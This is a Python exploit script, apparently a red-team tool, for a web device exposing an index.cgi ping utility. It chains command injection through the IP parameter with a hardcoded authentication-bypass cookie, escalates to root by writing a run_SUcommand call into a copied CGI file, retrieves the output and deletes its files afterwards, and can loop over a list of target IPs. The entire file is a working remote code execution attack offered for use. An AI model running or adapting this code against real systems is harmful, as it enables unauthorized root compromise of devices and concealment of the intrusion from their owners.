import requests
import argparse
from os import path

# used by web rce
def __parse_ping_results(results:str) -> str:
    start_stub = "xxxxxx-->"
    end_stub = "<br><br><!--xxxxxxx"
    res_start = results.find(start_stub) + len(start_stub)
    res_end = results.find(end_stub, res_start)
    return results[res_start:res_end]

# used by root rce
def web_rce(target:str, cmd:str) -> str:
    # path to ping utility with command appended
    URL = f"http://{target}/index.cgi?J=PINGTEST&IP=localhost|{cmd}"

    # cookie value bypasses authentication
    HEADERS = {"Cookie": "P=2465"}

    # returns the parsed web request results
    return __parse_ping_results(requests.get(URL, headers = HEADERS).text)

# used by elite haxorz
def root_rce(target:str, cmd:str) -> str:
    # create the cgi file
    web_rce(target, "cp index.cgi nwrtredteam.cgi")

    # append out command
    web_rce(target, f'''echo 'run_SUcommand("echo `{cmd}` > /amega/nwrtredteamoutput.txt")%3b' >> nwrtredteam.cgi''')

    # execute the cgi file
    requests.get(f"http://{target}/nwrtredteam.cgi")

    # results
    results = requests.get(f"http://{target}/nwrtredteamoutput.txt").text

    # clean up both files
    web_rce(target, "rm nwrtredteam*")

    # return results
    return results

# modules can run, too!
if __name__ == '__main__':
    # add cli arguments
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "targets",
        help="IP or file containing IPs",
        type=str
    )
    parser.add_argument(
        "command",
        help="command to run",
        type=str
    )
    parser.add_argument(
        "-s",
        "--sudo",
        help="run command as 'root' instead of 'www-data' (slower)",
        action="store_true"
    )
    args = parser.parse_args()

    # if targets is a file
    if path.exists(args.targets):
        with open(args.targets, "r") as rf:
            for target in rf.readlines():
                target = target.rstrip()
                print(f"[+] running '{args.command}' against '{target}' (sudo: {args.sudo})")
                if args.sudo:
                    print(root_rce(target, args.command))
                else:
                    print(web_rce(target, args.command))

    # else targets is an IP
    else:
        print(f"[+] running '{args.command}' against '{args.targets}' (sudo: {args.sudo})")
        if args.sudo:
            print(root_rce(args.targets, args.command))
        else:
            print(web_rce(args.targets, args.command))